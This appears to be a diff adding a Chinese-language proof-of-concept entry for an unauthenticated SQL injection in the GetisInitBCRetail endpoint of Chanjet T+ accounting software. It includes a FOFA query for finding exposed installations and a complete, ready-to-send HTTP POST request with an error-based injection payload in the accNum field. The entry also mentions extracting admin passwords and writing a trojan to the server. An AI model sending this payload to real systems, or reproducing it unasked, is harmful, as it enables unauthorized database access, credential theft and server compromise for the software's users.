@@ -1,0 +1,19 @@
+## 畅捷通TGetisInitBCRetail SQL注入漏洞
+
+## 一、漏洞简介
+由于畅捷通T+的GetisInitBCRetail接口处未对用户的输入进行过滤和校验，未经身份验证的攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+
+## fofa
+```
+app="畅捷通-TPlus"
+```
+
+## poc
+```
+POST /tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearController,Ufida.T.SM.UIP.ashx?method=GetisInitBCRetail HTTP/1.1
+Host: [已模糊处理]
+Content-Type: application/json
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+{"accNum":"1' AND 5227 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113))+(SELECT (CASE WHEN (5227=5227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(120)+CHAR(113))-- -NCab"}
+```
